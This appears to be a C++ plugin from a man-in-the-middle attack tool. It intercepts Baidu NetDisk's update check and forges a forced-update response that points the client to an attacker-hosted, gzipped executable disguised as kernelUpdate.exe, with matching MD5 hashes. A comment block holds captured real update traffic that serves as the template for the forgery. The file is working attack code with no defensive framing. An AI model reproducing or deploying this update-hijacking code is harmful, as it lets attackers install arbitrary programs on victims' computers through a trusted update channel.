#include "baiduNetDisk.h"

#include "PluginServer.h"
#include "../attacker.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../FileOper.h"
#include <iostream>
#include "../cipher/Base64.h"
#include "../cipher/compression.h"



int BaiduNetDisk::isBaiduUpdateJson(const char * url, const char * host) {
	if (strstr(host, "pan.baidu.com") && strstr(url, "/api/version/getlatestversion?") )
	{
		return TRUE;
	}

	return FALSE;
}

int BaiduNetDisk::replyBaiduJson(char * dstbuf, int len, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {

	char * lpRespFormat="HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=UTF-8\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	string ipnormal = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

	string szjsonfn = "baiduyunUpdate.json";

	string gzfilename = "kernelUpdate.gz";
	
	string exefilename = "kernelUpdate.exe";

	string szjsfp = Public::getUserPluginPath(lphttp->username) + szjsonfn;

	string exefp= Public::getUserPluginPath(lphttp->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
	
	string gzfp = Public::getUserPluginPath(lphttp->username) + gzfilename;

	int ret = Compress::gzfile(exefp, gzfp,TRUE,exefilename);

	char gzmd5[64] = { 0 };
	unsigned char gzhexmd5[64] = { 0 };
	int gzfilesize = CryptoUtils::getUpdateFileMd5(gzfp.c_str(), gzmd5, gzhexmd5, 1);

	string jsondatafmt = 
	"{\r\n"
		"\"version\":\"9.9.2.83\",\r\n"
		"\"kueinfo\":\r\n"
		"{\r\n"
		"\"name\":\"kernelUpdate.exe\", \r\n"
		"\"version\":\"9.9.70.40\", \r\n"
		"\"url\":\"http://%s/%s\", \r\n"
		"\"md5\":\"%s\"\r\n"
		"}\r\n"
	"}";

	char szjsdata[0x1000];
	int szjslen = wsprintfA(szjsdata,jsondatafmt.c_str(), ipnormal.c_str(), gzfilename.c_str(), gzmd5);

	ret = FileOper::fileWriter(szjsfp.c_str(), szjsdata, szjslen, 1);

	char jsmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int jsfilesize = CryptoUtils::getUpdateFileMd5(szjsfp, jsmd5, hexmd5, 1);
	if (jsfilesize <= 0)
	{
		return FALSE;
	}

	string version = "9.9.23.863";		//1.0.23.863

	char * retformat =
		"{\"force_update\":1,\"version\":\"%s\",\"url\":\"http:\\/\\/%s\\/%s\","
		"\"title\":\"kernel.dll\",\"detail\":\"\","
		"\"version_code\":\"0\",\"md5\":\"%s\",\"errno\":0}";

	string ip = HttpUtils::getIPstr(gServerIP) + "\\/" + lphttp->username;

	char result[4096];
	int retlen = sprintf(result, retformat,version.c_str(), ip.c_str(), szjsonfn.c_str(), jsmd5);

	int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

	return responseLen;
}




/*
GET /api/version/getlatestversion?clienttype=30&version=2.0.2.23&peerid=35434416659E23F1E9DFD6ACAC07C150&channel=p2p-pc_2.0_pc_netdisk_default HTTP/1.1
Host: pan.baidu.com

HTTP/1.1 200 OK
Cache-Control: no-cache
Connection: keep-alive
Content-Type: application/json; charset=UTF-8
Date: Tue, 07 Apr 2020 16:25:06 GMT
Flow-Level: 3
Logid: 9190830031386779235
P3p: CP=" OTI DSP COR IVA OUR IND COM "
Server: nginx
Set-Cookie: BAIDUID=72A2F8F526219AA1EE99DD06C15E8C4C:FG=1; expires=Wed, 07-Apr-21 16:25:06 GMT; max-age=31536000; path=/; domain=.baidu.com; version=1
Vary: Accept-Encoding
X-Powered-By: BaiduCloud
Yld: 9190830031386779235
Yme: ZIGW+icyQE0WYisBRnb+qnFIufgAQgfrqwRFwSCGmFSrieZ9
Content-Length: 291

{"force_update":0,"version":"2.0.2.23","url":"http:\/\/issuecdn.baidupcs.com\/issue\/netdisk\/p2p-pc\/kui.json\/kui20223.json",
"title":"kernel.dll 2.2.60.75","detail":"1 \u57fa\u4e8e2.2.60.63\u4fee\u6539\u7248\u672c\u53f7\u91cd\u65b0\u63d0\u6d4b\u3002",
"version_code":"0","md5":"","errno":0}




GET /issue/netdisk/p2p-pc/kui.json/kui20223.json HTTP/1.1
Content-Type: text/json
Host: issuecdn.baidupcs.com

HTTP/1.1 200 OK
Server: JSP3/2.0.14
Date: Tue, 07 Apr 2020 16:25:06 GMT
Content-Type: text/json
Content-Length: 779
Connection: keep-alive
ETag: 7bfef04ef9cc4878b576b4c89890a26d
Last-Modified: Wed, 25 Mar 2020 04:03:24 GMT
Expires: Thu, 09 Apr 2020 04:20:47 GMT
Age: 129859
Accept-Ranges: bytes
Cache-Control: max-age=259200
Content-Disposition: attachment;filename="kui20223.json"
x-bs-client-ip: MjIzLjExMS4xMjcuNTk=
x-bs-file-size: 779
x-bs-request-id: MTAuMTM0LjExNy40MTo4NjQzOjE5NjAxMjQ3NDg2OTA0NTE5MDE6MjAyMC0wMy0yNSAxMjoyMDozMw==
x-bs-meta-crc32: 3193197358
Content-MD5: 7bfef04ef9cc4878b576b4c89890a26d
superfile: 0
Ohc-Response-Time: 1 0 0 0 0 0
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS, HEAD
Ohc-Cache-HIT: hn2cm59 [4], yangzcmcache59 [2]

{"version":"2.0.2.23",
"KUInfo":{"name":"kernel.dll","version":"2.2.60.75","url":"http://issuecdn.baidupcs.com/issue/netdisk/p2p-pc/kernel/kernel.226075.gz","md5":"ba1b161be276e8c718c8e303e3139b00"},
"k1info":{"name":"kernelbasis.dll","version":"2.1.5.18","url":"http://issuecdn.baidupcs.com/issue/netdisk/p2p-pc/kernelbasis/kernelbasis.21518.gz","md5":"75412f1adb02efe4b6513cff9c69242a"},
"k2info":{"name":"kernelpromote.dll","version":"2.2.60.6","url":"http://issuecdn.baidupcs.com/issue/netdisk/p2p-pc/kernelpromote/kernelpromote.22606.gz ","md5":"78b5eda12587eb1c5bde8029b75b9e63"},
"kueinfo":{"name":"kernelUpdate.exe","version":"2.0.0.9","url":"http://issuecdn.baidupcs.com/issue/netdisk/p2p-pc/kernelUpdate/kernelUpdate.2009.gz","md5":"64a23eee7e81b0f45056221e9fde7c4a"}}

*/